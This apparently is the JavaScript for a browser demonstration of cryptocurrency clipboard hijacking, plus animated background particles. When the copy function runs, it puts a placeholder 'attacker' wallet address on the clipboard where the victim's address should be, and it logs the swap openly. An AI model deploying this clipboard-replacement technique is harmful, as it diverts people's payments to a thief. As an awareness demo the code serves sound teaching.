const victimAddress = "1FAKEyBoTx3zzQ8ZfKoin3EV1XoYSmUhkL";
const attackerAddress = "1ATTACKx7oP3KzXQ3HackMePlz0nlyLOL";

function copyAddress() {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(attackerAddress)
      .then(() => {
        log(`🚨 Clipboard hijacked!`);
        log(`🧍 Victim copied: ${victimAddress}`);
        log(`💀 Replaced with: ${attackerAddress}`);
      })
      .catch(() => fallbackCopy());
  } else {
    fallbackCopy();
  }
}

function fallbackCopy() {
  const input = document.createElement("input");
  input.value = attackerAddress;
  document.body.appendChild(input);
  input.select();
  try {
    document.execCommand("copy");
    log("⚠️ Fallback copy method used.");
    log(`💀 Replaced with: ${attackerAddress}`);
  } catch {
    log("❌ Clipboard copy failed.");
  }
  document.body.removeChild(input);
}

function log(msg) {
  const logEl = document.getElementById("log");
  const time = new Date().toLocaleTimeString();
  logEl.innerHTML += `[${time}] ${msg}<br>`;
  logEl.scrollTop = logEl.scrollHeight;
}

// Animated cyber particles
const canvas = document.getElementById("backgroundCanvas");
const ctx = canvas.getContext("2d");
let dots = [];

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener("resize", resizeCanvas);

for (let i = 0; i < 60; i++) {
  dots.push({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    r: Math.random() * 2 + 1,
    dx: Math.random() * 0.5,
    dy: Math.random() * 0.5,
  });
}

function drawParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  for (let dot of dots) {
    ctx.beginPath();
    ctx.arc(dot.x, dot.y, dot.r, 0, Math.PI * 2);
    ctx.fillStyle = "#00ffae33";
    ctx.fill();
    dot.x += dot.dx;
    dot.y += dot.dy;
    if (dot.x > canvas.width) dot.x = 0;
    if (dot.y > canvas.height) dot.y = 0;
  }
  requestAnimationFrame(drawParticles);
}
drawParticles();
